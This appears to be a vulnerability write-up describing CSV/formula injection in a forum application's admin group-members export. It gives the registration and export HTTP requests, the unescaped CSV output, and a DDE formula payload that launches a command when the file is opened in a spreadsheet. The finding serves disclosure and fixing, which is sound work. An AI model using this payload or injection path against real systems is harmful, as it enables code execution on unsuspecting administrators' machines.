### VULN-010 — CSV/formula injection in group-members export

### Attacker (unprivileged): register with a username starting with a formula trigger.
### Usernames permit leading '+' and '-' (isUserNameValid); '=' and '@' are blocked in usernames,
### but the EMAIL field permits them (isEmailValid only forbids ',' and ';'), enabling a full
### =cmd|'/C calc'!A1 DDE payload via a self-set email.
POST /api/v3/users   {"username":"+HYPERLINK_<rand>", ...}

### Later, an ADMIN exports the group (note: getCSV requires a Referer under /admin/manage/groups):
GET /api/admin/groups/<group>/csv HTTP/1.1
Host: localhost:21372
Cookie: express.sid=<admin sid>
Referer: http://localhost:21372/admin/manage/groups

# -> 200, text/csv:
#    "email","username","uid"
#    "","+HYPERLINK_<rand>",9        <-- username cell begins with '+', NOT prefixed with ' (un-neutralized)
#
# When the admin opens this in Excel/LibreOffice, a cell starting with = + - @ is evaluated as a formula
# (formula/DDE injection). The users export (/api/admin/users/csv) neutralizes such cells; the group
# export does not.
